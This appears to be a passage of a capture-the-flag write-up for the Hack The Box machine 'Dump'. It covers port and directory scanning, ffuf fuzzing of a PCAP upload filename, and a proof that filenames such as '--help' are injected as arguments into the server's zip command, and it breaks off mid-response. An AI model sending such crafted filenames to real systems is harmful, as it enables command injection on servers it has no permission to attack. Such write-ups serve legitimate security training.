@@ -1,0 +1,973 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Dump</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#htb-dump">htb-dump</a> <a class="post-tag" href="/tags#vulnlab">vulnlab</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#debian">debian</a> <a class="post-tag" href="/tags#feroxbuster">feroxbuster</a> <a class="post-tag" href="/tags#wildcard-injection">wildcard-injection</a> <a class="post-tag" href="/tags#injection">injection</a> <a class="post-tag" href="/tags#parameter-injection">parameter-injection</a> <a class="post-tag" href="/tags#ffuf">ffuf</a> <a class="post-tag" href="/tags#command-injection">command-injection</a> <a class="post-tag" href="/tags#directory-traversal">directory-traversal</a> <a class="post-tag" href="/tags#sudo">sudo</a> <a class="post-tag" href="/tags#sudo-parameter-injection">sudo-parameter-injection</a> <a class="post-tag" href="/tags#file-read">file-read</a> <a class="post-tag" href="/tags#apparmor">apparmor</a> </span><br/><br/>
+<time class="dt-published" datetime="2025-11-04T10:00:00+00:00" itemprop="datePublished">Nov 4, 2025
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2025/11/04/htb-dump.html" style="color: #e6e6e6; text-decoration: none;">HTB: Dump</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="/img/dump-cover.webp" type="image/webp"/>
+<img alt="Dump" class="include_image" loading="lazy" src="/img/dump-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:150px;">
+</img></picture>
+<p>Dump has a website that collects packets on a specific port. It can also handle PCAP uploads and download all the current PCAP files in a zip archive. I’ll abuse wildcard injection in the zip command with some carefully crafted filenames to get RCE and a shell. I’ll pivot to the next user with a password from the database. I’ll then abuse how www-data can run sudo to run tcpdump to get root.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/793 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/dump" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Dump</a> <a href="https://hackthebox.com/machines/dump" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-dump.webp" type="image/webp"/> <img alt="Dump" class="img-av" src="/icons/box-dump.png"/></picture></a><br/><a href="https://hackthebox.com/machines/dump" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1983942048278323674">30 Oct 2025</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">30 Oct 2025</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Hard">Hard [40]</span></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/77141" rel="noopener" target="_blank"><img alt="jkr" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/77141" style="display: unset"/><span class="user-text" style="display: none"> jkr</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="initial-scanning">Initial Scanning</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds two open TCP ports, SSH (22) and HTTP (80):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">-vvv</span> <span class="nt">--min-rate</span> 10000 10.129.26.68
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-01 09:14 UTC
+...[snip]...
+Nmap scan report for 10.129.26.68
+Host is up, received reset ttl 63 (0.031s latency).
+Scanned at 2025-11-01 09:14:48 UTC for 6s
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 6.95 seconds
+           Raw packets sent: 68051 (2.994MB) | Rcvd: 65636 (2.625MB)
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80 <span class="nt">-sCV</span> 10.129.26.68
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-01 09:15 UTC
+Nmap scan report for 10.129.26.68
+Host is up (0.021s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u5 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 fb:31:61:8d:2f:86:e5:60:f9:e6:24:a3:1c:62:0c:ae (RSA)
+|   256 0c:b7:c4:fb:4a:fc:31:1b:e9:4b:0b:d1:19:56:2f:ce (ECDSA)
+|_  256 3c:c6:e8:71:4d:9a:d5:1d:86:dd:dd:6c:82:ee:7e:4d (ED25519)
+80/tcp open  http    Apache httpd 2.4.65 ((Debian))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-title: hdmpll?
+|_http-server-header: Apache/2.4.65 (Debian)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.62 seconds
+</span></code></pre></div></div>
+<p>Based on the <a href="/cheatsheets/os#debian">OpenSSH version</a>, the host is likely running Debian 11 Bullseye.</p>
+<p>All of the ports show a TTL of 63, which matches the <a href="/cheatsheets/os#os-identification">expected TTL</a> for Linux one hop away.</p>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>The site presents a simple login / registration form with a header about packet inspection:</p>
+<picture>
+<source srcset="/img/image-20251031213334084.webp" type="image/webp"/>
+<img alt="image-20251031213334084" class="include_image" loading="lazy" src="/img/image-20251031213334084.png"/>
+</picture>
+<p>Any login guesses I make just show the same message:</p>
+<picture>
+<source srcset="/img/image-20251031213435551.webp" type="image/webp"/>
+<img alt="image-20251031213435551" class="include_image" loading="lazy" src="/img/image-20251031213435551.png"/>
+</picture>
+<p>If I click Register, it shows that an account was created:</p>
+<picture>
+<source srcset="/img/image-20251031213459600.webp" type="image/webp"/>
+<img alt="image-20251031213459600" class="include_image" loading="lazy" src="/img/image-20251031213459600.png"/>
+</picture>
+<p>And I can login. The site is very simple, offering packet capture tools:</p>
+<picture>
+<source srcset="/img/image-20251031220712829.webp" type="image/webp"/>
+<img alt="image-20251031220712829" class="include_image" loading="lazy" src="/img/image-20251031220712829.png"/>
+</picture>
+<p>Clicking “Capture Live Traffic” shows a capture screen:</p>
+<picture>
+<source srcset="/img/image-20251031220747659.webp" type="image/webp"/>
+<img alt="image-20251031220747659" class="include_image" loading="lazy" src="/img/image-20251031220747659.png"/>
+</picture>
+<p>It’s capturing on port 27714. After 10 seconds, it fills in with stats:</p>
+<picture>
+<source srcset="/img/image-20251031220800736.webp" type="image/webp"/>
+<img alt="image-20251031220800736" class="include_image" loading="lazy" src="/img/image-20251031220800736.png"/>
+</picture>
+<p>It didn’t capture anything. Clicking “here” loads <code class="language-plaintext highlighter-rouge">/view.php?fn=c0061667-4e91-4f09-bfeb-b3669046c05a</code> and shows an error:</p>
+<picture>
+<source srcset="/img/image-20251031220836881.webp" type="image/webp"/>
+<img alt="image-20251031220836881" class="include_image" loading="lazy" src="/img/image-20251031220836881.png"/>
+</picture>
+<p>If I try again, and this time run <code class="language-plaintext highlighter-rouge">curl 10.129.26.68:27714</code> a few times while it’s capturing, it’ll show some packets:</p>
+<picture>
+<source srcset="/img/image-20251031221042532.webp" type="image/webp"/>
+<img alt="image-20251031221042532" class="include_image" loading="lazy" src="/img/image-20251031221042532.png"/>
+</picture>
+<p>And the “here” link shows the raw packet data that looks like <code class="language-plaintext highlighter-rouge">tcpdump</code> output:</p>
+<p><a href="/img/image-20251031221125963.png"><img alt="image-20251031221125963" src="/img/image-20251031221125963.png"/><em>Click for full size image</em></a></p>
+<p>Back on the index page, there’s now some captures listed:</p>
+<picture>
+<source srcset="/img/image-20251031221148949.webp" type="image/webp"/>
+<img alt="image-20251031221148949" class="include_image" loading="lazy" src="/img/image-20251031221148949.png"/>
+</picture>
+<p>“Download Captures” provides a zip archive with all three PCAPs in it. If I create a file (such as an empty file named <code class="language-plaintext highlighter-rouge">test.pcap</code>) and upload it, it shows up in the capture list:</p>
+<picture>
+<source srcset="/img/image-20251031221450140.webp" type="image/webp"/>
+<img alt="image-20251031221450140" class="include_image" loading="lazy" src="/img/image-20251031221450140.png"/>
+</picture>
+<h4 id="tech-stack">Tech Stack</h4>
+<p>The HTTP response headers show a <code class="language-plaintext highlighter-rouge">PHPSESSID</code> is set on first visit:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Sat, 01 Nov 2025 01:27:54 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.65 (Debian)</span>
+<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=2celb3j7qoovdmfpcac4tm5452; path=/</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">954</span>
+<span class="na">Keep-Alive</span><span class="p">:</span> <span class="s">timeout=5, max=100</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">Keep-Alive</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+</code></pre></div></div>
+<p>The main page is <code class="language-plaintext highlighter-rouge">index.php</code> as well. So it is a PHP site.</p>
+<p>The 404 page is the <a href="/cheatsheets/404#apache--httpd">default Apache 404</a>:</p>
+<picture>
+<source srcset="/img/image-20251031221742459.webp" type="image/webp"/>
+<img alt="image-20251031221742459" class="include_image" loading="lazy" src="/img/image-20251031221742459.png"/>
+</picture>
+<p>Looking through the requests, the response to <code class="language-plaintext highlighter-rouge">/download.php</code> is interesting:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">301</span> <span class="ne">Moved Permanently</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Sat, 01 Nov 2025 02:12:06 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.65 (Debian)</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Location</span><span class="p">:</span> <span class="s">downloads/0984d7dc-b1e8-4987-a144-b3f64cf48b88.zip</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">216</span>
+<span class="na">Keep-Alive</span><span class="p">:</span> <span class="s">timeout=5, max=100</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">Keep-Alive</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+
+Preparing download...
+<span class="c">&lt;!--
+  adding: 0f0a5865-6b8c-4e83-8ebe-b2fa5680f6d1 (deflated 56%)
+  adding: 2589e07e-2395-4bfa-ba41-9b5e1d530b3b (deflated 33%)
+  adding: c0061667-4e91-4f09-bfeb-b3669046c05a (deflated 33%)
+--&gt;</span>
+</code></pre></div></div>
+<p>The comment looks a lot like the output of the <code class="language-plaintext highlighter-rouge">zip</code> command on Linux. For example:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>zip test.zip <span class="k">*</span>
+<span class="go">  adding: assets/ (stored 0%)
+  adding: dump.md (deflated 61%)
+  adding: test.pcap (stored 0%)
+</span></code></pre></div></div>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site, and include <code class="language-plaintext highlighter-rouge">-x php</code> since I know the site is PHP:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.129.26.68 <span class="nt">-x</span> php
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.129.26.68
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [php]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-red">403</span><span class="go">      GET        9l       28w      277c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-red">404</span><span class="go">      GET        9l       31w      274c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      222l      558w     4636c http://10.129.26.68/style.css
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       23l       64w      954c http://10.129.26.68/index.php
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       28w      316c http://10.129.26.68/downloads =&gt; </span><span class="feroxbuster-yellow">http://10.129.26.68/downloads/</span><span class="go">
+</span><span class="feroxbuster-yellow">302</span><span class="go">      GET        0l        0w        0c http://10.129.26.68/upload.php =&gt; </span><span class="feroxbuster-yellow">index.php</span><span class="go">
+</span><span class="feroxbuster-yellow">302</span><span class="go">      GET        0l        0w        0c http://10.129.26.68/logout.php =&gt; </span><span class="feroxbuster-yellow">index.php</span><span class="go">
+</span><span class="feroxbuster-yellow">302</span><span class="go">      GET        0l        0w        0c http://10.129.26.68/view.php =&gt; </span><span class="feroxbuster-yellow">index.php</span><span class="go">
+</span><span class="feroxbuster-yellow">302</span><span class="go">      GET        2l        3w       27c http://10.129.26.68/download.php =&gt; </span><span class="feroxbuster-yellow">index.php</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       23l       64w      954c http://10.129.26.68/
+</span><span class="feroxbuster-yellow">302</span><span class="go">      GET        1l        2w       17c http://10.129.26.68/delete.php =&gt; </span><span class="feroxbuster-yellow">index.php</span><span class="go">
+</span><span class="feroxbuster-yellow">302</span><span class="go">      GET        0l        0w        0c http://10.129.26.68/capture.php =&gt; </span><span class="feroxbuster-yellow">index.php</span><span class="go">
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 37s    60006/60006   0s      </span><span class="feroxbuster-green">found</span><span class="go">:10      </span><span class="feroxbuster-red">errors</span><span class="go">:0      
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 35s    30000/30000   858/s   http://10.129.26.68/ 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 36s    30000/30000   834/s   http://10.129.26.68/downloads/   
+</span></code></pre></div></div>
+<p>Nothing I haven’t seen already.</p>
+<h2 id="shell-as-www-data">Shell as www-data</h2>
+<h3 id="parameter-injection">Parameter Injection</h3>
+<h4 id="special-character-fuzzing">Special Character Fuzzing</h4>
+<p>I’ll save the upload request to a file and add a FUZZ in the file name:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/upload.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">10.129.26.68</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate, br</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">multipart/form-data; boundary=----geckoformboundary319f5b7c082c304c30704cdc554c1368</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">361</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://10.129.26.68</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://10.129.26.68/</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=2celb3j7qoovdmfpcac4tm5452</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Priority</span><span class="p">:</span> <span class="s">u=0, i</span>
+
+------geckoformboundary319f5b7c082c304c30704cdc554c1368
+Content-Disposition: form-data; name="submit"
+
+Upload Capture
+------geckoformboundary319f5b7c082c304c30704cdc554c1368
+Content-Disposition: form-data; name="fileToUpload"; filename="test-FUZZ.pcap"
+Content-Type: application/vnd.tcpdump.pcap
+
+
+------geckoformboundary319f5b7c082c304c30704cdc554c1368--
+</code></pre></div></div>
+<p>Now I’ll run <code class="language-plaintext highlighter-rouge">ffuf</code> with a special characters wordlist to try uploading a bunch of times with different characters in the filename:</p>
+<div class="language-console code-collapse highlighter-rouge" data-trunc="500"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ffuf <span class="nt">-request</span> upload.request <span class="nt">-w</span> /opt/SecLists/Fuzzing/special-chars.txt <span class="nt">-request-proto</span> http
+<span class="go">        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://10.129.26.68/upload.php
+ :: Wordlist         : FUZZ: /opt/SecLists/Fuzzing/special-chars.txt
+ :: Header           : Origin: http://10.129.26.68
+ :: Header           : Connection: keep-alive
+ :: Header           : Referer: http://10.129.26.68/
+ :: Header           : Cookie: PHPSESSID=2celb3j7qoovdmfpcac4tm5452
+ :: Header           : Upgrade-Insecure-Requests: 1
+ :: Header           : Host: 10.129.26.68
+ :: Header           : Accept-Encoding: gzip, deflate, br
+ :: Header           : Content-Type: multipart/form-data; boundary=----geckoformboundary319f5b7c082c304c30704cdc554c1368
+ :: Header           : Priority: u=0, i
+ :: Header           : User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0
+ :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+ :: Header           : Accept-Language: en-US,en;q=0.5
+ :: Data             : ------geckoformboundary319f5b7c082c304c30704cdc554c1368
+Content-Disposition: form-data; name="submit"
+
+Upload Capture
+------geckoformboundary319f5b7c082c304c30704cdc554c1368
+Content-Disposition: form-data; name="fileToUpload"; filename="test-FUZZ.pcap"
+Content-Type: application/vnd.tcpdump.pcap
+
+
+------geckoformboundary319f5b7c082c304c30704cdc554c1368--
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+!                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 23ms]
+~                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 23ms]
+@                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 21ms]
+</span><span class="c">#                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 21ms]
+</span><span class="go">^                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 21ms]
+%                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 21ms]
+)                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 23ms]
+$                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 23ms]
+_                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 23ms]
+{                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 23ms]
+-                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 22ms]
+*                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 24ms]
+/                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 424ms]
+}                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 1428ms]
+&gt;                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 1428ms]
+(                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 2430ms]
+&amp;                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 2431ms]
++                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 2432ms]
+|                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 2432ms]
+]                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 3434ms]
+?                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 3435ms]
+[                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 3438ms]
+;                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 3438ms]
+"                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 3438ms]
+`                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 3439ms]
+:                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 3439ms]
+=                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 3440ms]
+\                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 4441ms]
+'                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 4442ms]
+&lt;                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 4443ms]
+,                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 4445ms]
+.                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 4446ms]
+:: Progress: [32/32] :: Job [1/1] :: 7 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
+</span></code></pre></div></div>
+<p>All these files are present in the web UI:</p>
+<picture>
+<source srcset="/img/image-20251031223305416.webp" type="image/webp"/>
+<img alt="image-20251031223305416" class="include_image" loading="lazy" src="/img/image-20251031223305416.png"/>
+</picture>
+<p>If I download, I see all these files being zipped:</p>
+<div class="language-http code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">301</span> <span class="ne">Moved Permanently</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Sat, 01 Nov 2025 02:30:23 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.65 (Debian)</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Location</span><span class="p">:</span> <span class="s">downloads/438b99c8-73d3-475a-93fd-db4ad950e25e.zip</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">1262</span>
+<span class="na">Keep-Alive</span><span class="p">:</span> <span class="s">timeout=5, max=100</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">Keep-Alive</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+
+Preparing download...
+<span class="c">&lt;!--
+  adding: 0f0a5865-6b8c-4e83-8ebe-b2fa5680f6d1 (deflated 56%)
+  adding: 2589e07e-2395-4bfa-ba41-9b5e1d530b3b (deflated 33%)
+  adding: c0061667-4e91-4f09-bfeb-b3669046c05a (deflated 33%)
+  adding: test- (stored 0%)
+  adding: test-!.pcap (stored 0%)
+  adding: test-#.pcap (stored 0%)
+  adding: test-$.pcap (stored 0%)
+  adding: test-%.pcap (stored 0%)
+  adding: test-&amp;.pcap (stored 0%)
+  adding: test-'.pcap (stored 0%)
+  adding: test-(.pcap (stored 0%)
+  adding: test-).pcap (stored 0%)
+  adding: test-*.pcap (stored 0%)
+  adding: test-+.pcap (stored 0%)
+  adding: test-,.pcap (stored 0%)
+  adding: test--.pcap (stored 0%)
+  adding: test-..pcap (stored 0%)
+  adding: test-:.pcap (stored 0%)
+  adding: test-;.pcap (stored 0%)
+  adding: test-&lt;.pcap (stored 0%)
+  adding: test-=.pcap (stored 0%)
+  adding: test-&gt;.pcap (stored 0%)
+  adding: test-?.pcap (stored 0%)
+  adding: test-@.pcap (stored 0%)
+  adding: test-[.pcap (stored 0%)
+  adding: test-].pcap (stored 0%)
+  adding: test-^.pcap (stored 0%)
+  adding: test-_.pcap (stored 0%)
+  adding: test-`.pcap (stored 0%)
+  adding: test-{.pcap (stored 0%)
+  adding: test-|.pcap (stored 0%)
+  adding: test-}.pcap (stored 0%)
+  adding: test-~.pcap (stored 0%)
+  adding: test.pcap (stored 0%)
+--&gt;</span>
+</code></pre></div></div>
+<p>Interestingly, there are four files I can’t delete:</p>
+<picture>
+<source srcset="/img/image-20251031223452792.webp" type="image/webp"/>
+<img alt="image-20251031223452792" class="include_image" loading="lazy" src="/img/image-20251031223452792.png"/>
+</picture>
+<h4 id="parameter-injection-poc">Parameter Injection POC</h4>
+<p>I’ll create a file named <code class="language-plaintext highlighter-rouge">--help</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">touch</span> <span class="nt">--</span> <span class="s1">'--help'</span>
+</code></pre></div></div>
+<p>When I upload this, and then click “Download Captures”, the browser ends up at a 404 page. Looking at the requests, the GET to <code class="language-plaintext highlighter-rouge">/download.php</code> returns a 301, but the zip creation seems to run <code class="language-plaintext highlighter-rouge">--help</code>:</p>
+<div class="language-http code-collapse highlighter-rouge" data-trunc="500"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">301</span> <span class="ne">Moved Permanently</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Sat, 01 Nov 2025 02:38:08 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.65 (Debian)</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Location</span><span class="p">:</span> <span class="s">downloads/0fd7b2aa-b32a-430a-ba6b-ebdb732fe295.zip</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">1452</span>
+<span class="na">Keep-Alive</span><span class="p">:</span> <span class="s">timeout=5, max=98</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">Keep-Alive</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+
+Preparing download...
+<span class="c">&lt;!--
